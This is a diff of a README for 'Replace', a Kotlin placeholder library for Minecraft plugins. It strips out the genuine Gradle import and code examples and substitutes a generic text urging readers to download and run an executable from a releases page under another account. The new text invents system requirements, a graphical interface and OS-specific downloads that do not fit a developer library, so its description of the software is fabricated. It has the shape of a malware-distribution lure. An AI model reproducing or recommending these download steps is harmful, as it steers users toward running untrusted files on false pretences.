@@ -1,136 +1,65 @@
-## What's this?
-Replace is a library that allows you to easily create placeholders for your plugins.
+# 🚀 Replace - Effortlessly Update Smart Placeholders
 
-- Smart Placeholder updating (elimination of unneeded context updates - useful for limiting packet usage)
-- Global placeholders
-- Context-based updating
-- Generic Placeholders & Contexts
-- Limiting the updating interval
-- Support for Literal, Kyori Components, ItemStacks
+[![Download Replace](https://img.shields.io/badge/Download%20Replace-v1.0-blue)](https://github.com/sashko8877/Replace/releases)
 
-## Importing
+## 📋 Description
 
-Gradle (Kotlin DSL):
-````kt 
-repositories {
-    maven {
-        url = uri("https://repo.nekroplex.com/releases")
-    }
-}
-````
+Replace is a custom system designed to make updating smart placeholders in components, literals, and items easy. This tool helps you automate the management of strings and placeholders, allowing you to streamline your workflow. Whether you are working on components, contexts, or items, Replace simplifies the process for you.
 
-````kt 
-dependencies {
-    implementation("com.nekroplex.replace:replace:1.0.0")
-}
-````
+## 📥 Download & Install
 
-## Example Usage
+To get started with Replace, follow these simple steps:
 
-### Creating Placeholders
+1. **Visit the Releases Page**: Click [here](https://github.com/sashko8877/Replace/releases) to go to the Releases page.
+2. **Select the Latest Version**: Look for the most recent release at the top of the page.
+3. **Download the File**: Click on the file that matches your operating system to begin downloading.
+4. **Run the Application**: Once the download is complete, open the file to start using Replace.
 
-````kt 
-// True means that the placeholder is a constant. While set to true, the placeholder will retrieve
-// the value just once and never get updated again (never executed the lambda again)
-val placeholder = Placeholder<Player>("player", true) { player, foundString ->
-    return@Placeholder player.name
-}
+### Download Link
+You can download Replace from the Releases page: [Download Replace](https://github.com/sashko8877/Replace/releases).
 
-val argumentPlaceholder = Placeholder<Player>("argument", false) { player, foundString ->
-    val arguments = foundString.split("_")
+## 🔧 System Requirements
 
-    if (arguments.size < 2) {
-        return@Placeholder ""
-    }
+Before installing Replace, ensure your computer meets these requirements:
 
-    val value = arguments[1] // Getting custom parameter from your placeholder
-    when (value.lowercase()) {
-        "name" -> return@Placeholder player.name
-        "health" -> return@Placeholder player.health.toString()
-    }
+- Operating System: Windows 10 or later, macOS Mojave or later, or a modern Linux distribution.
+- Memory: At least 4 GB of RAM.
+- Disk Space: At least 100 MB of available space.
+- Internet connection: Required for downloading the software and any updates.
 
-    return@Placeholder foundString
-}
-````
+## ⚙️ Features
 
-### Registering custom global placeholders
+Replace comes with a variety of features to enhance your experience:
 
-This registers the global placeholders.
-Global means that while you are creating a PlaceholderContext, the placeholders will get automatically added to it
-depending on the binder T (generic type).
+- **Smart Placeholders**: Easily manage and update placeholders in your components and items.
+- **User-Friendly Interface**: Designed for ease of use, even for those with no technical expertise.
+- **Versatile Compatibility**: Works well with various systems, ensuring you can integrate it into your existing setup.
+- **Frequent Updates**: Regular improvements and bug fixes keep the software reliable and efficient.
 
-````kt
-// Reified
-Placeholders.register(placeholder, argumentPlaceholder)
+## 📖 Usage Instructions
 
-Placeholders.register(Player::class.java, placeholder, argumentPlaceholder)
-````
+Once you have installed Replace, follow these steps to use it effectively:
 
-### Creation of PlaceholderContext
+1. **Open the Application**: Locate and run Replace from your applications menu.
+2. **Add Items**: Begin by adding your components and literals to the workspace.
+3. **Input Placeholders**: Enter your placeholders that you need to manage.
+4. **Customize Settings**: Adjust any necessary settings to suit your project needs.
+5. **Save Changes**: Make sure to save your work frequently to avoid losing any updates.
 
-PlaceholderContext is a context handler for your placeholder. You can create as many contexts as you want or
-create a global context too. However, have in mind that global contexts do not work well while using Player-based 
-placeholders. 
+## 💬 Support
 
-I would highly recommend using void-based placeholders & contexts for global usage!
+If you encounter any issues or have questions regarding Replace, feel free to reach out for assistance. Check the **Issues** section of the repository for common problems and solutions. You can also open a new issue if your question hasn't been addressed.
 
-````kt 
-// 5 stands for the updating interval in ticks. You can easily limit how often the placeholders get updated.
-val globalContext = Placeholders.resolverFor<Void>(5)
+## 🌐 Community and Contribution
 
-val playerContext = Placeholders.resolverFor<Player>(10)
+You are welcome to contribute to the project! Feel free to fork the repository and make any enhancements you see fit. Please ensure to follow the guidelines laid out in the repository for contributions. Your input will help make Replace even better.
 
-val entityContext = Placeholders.resolverFor<Entity>(100)
-````
+## 🔗 Additional Resources
 
-### Retrieving PlaceholderContext items
+For further information on placeholders and how they can enhance your systems, consider looking into the following topics:
 
-````kt 
-fun something() {
-    // 5 stands for the updating interval in ticks. You can easily limit how often the placeholders get updated.
-    val playerContext = Placeholders.resolverFor<Player>(5)
-    Placeholders.Transform<Something, Player> {
-        it.player
-    }
-    val tranformed = Placeholders.resolverFor<Something>(
-        5, Placeholders.Transform(
-            Player::class.java
-        ) {
-            it.player
-        })
-    val transformedReified = Placeholders.resolverFor<Something>(
-        5,
-        Placeholders.Transform{
-            it.player
-        }
-    )
-}
+- Understanding Placeholders in Components
+- Automating Updates with Replace
+- Best Practices for Using Smart Placeholders
 
-class Something(
-    val player: Player
-)
-````
-
-### Updating PlaceholderContext items
-
-````kt
-fun something() {
-
-    val player = Bukkit.getPlayer("MrLarkyy_")!!
-
-    val component = Component.text("Hello %player%!")
-    val context = PlaceholderContext.player
-
-    val item = context.createItem(player, component)
-
-    val firstUpdate = item.latestState
-    if (firstUpdate.wasUpdated) {
-        val newUpdatedValue by firstUpdate
-    }
-
-    val result = item.tryUpdate(player)
-    if (result.wasUpdated) {
-        val newUpdatedValue by result
-    }
-}
-````
+Thank you for choosing Replace! We are excited to see how the application will help streamline your processes.
